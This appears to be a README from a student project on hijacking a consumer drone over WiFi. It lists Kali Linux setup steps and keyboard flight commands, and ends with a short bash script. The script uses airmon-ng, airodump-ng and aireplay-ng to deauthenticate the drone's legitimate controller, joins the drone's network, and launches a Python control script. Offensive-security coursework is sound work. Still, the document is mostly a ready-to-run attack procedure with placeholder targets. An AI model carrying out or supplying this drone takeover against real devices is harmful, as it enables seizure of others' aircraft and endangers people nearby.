
##########################################################################
What must be downloaded/installed:

Install this whole git:
ttps://github.com/N-Bz/bybop?fbclid=IwAR0ou90LRnVPkV_PyfO_2_02XVizOp5gY9nraqe7zKFtWM9tHosm6IxblJQ

OR

Use the zip file provided from blackboard

The python code has to be run using python 3. (We ran on Kali Linux).
Update OS just in case (sudo apt-get update)
Install python 3 (sudo apt-get install python3)
Install python 3 pip (sudo apt-get install python3-pip)
Install zeroconf (sudo apt-get install python3-zeroconf)
(or sudo pip3 install zeroconf)
Install getkey through pip3 (sudo pip3 install getkey)
Install untangle through pip3 (sudo pip3 install untangle)
There must also be an ARSDK path to the same directory as the code.: 
(export ARSDK_PATH=/directory-of-code)

###########################################################################

To run the bash script, you must be in the same directory as the script.
To execute the script, type this into terminal:
./attack.sh

############################################################################

Executing the code:
-Connect computer's network to the drone's wifi
-Open terminal and type 'python3 saad.py'

############################################################################

What to do while running:
When the code starts running, it will first try to connect to the drone. 
If it is successful, a very tiny window will open up which is where you enter
the commands from the laptop to the drone. 
If connection fails, try again or try restarting the drone.
Once it is connected, you can begin typing commands to be sent
to the drone. Hit these keys on your keyboard to perform
their commands:
T = Take off
L = Land
A = Left tilt  (Left roll)
D = Right tilt (Right roll)
W = Tilt forwards (Forward pitch)
S = Tilt backwards (Backward pitch)

############################################################################




Bash script:
#! /bin/bash

airmon-ng start wlan0
airodump-ng -c 5 --bssid <BSSID> wlan0mon
aireplay-ng --deauth 6 -a <BSSID> wlan0mon
airmon-ng stop wlan0mon
sleep 5
nmcli d wifi connect <ESSID>
python3 saad.py
###########################################################################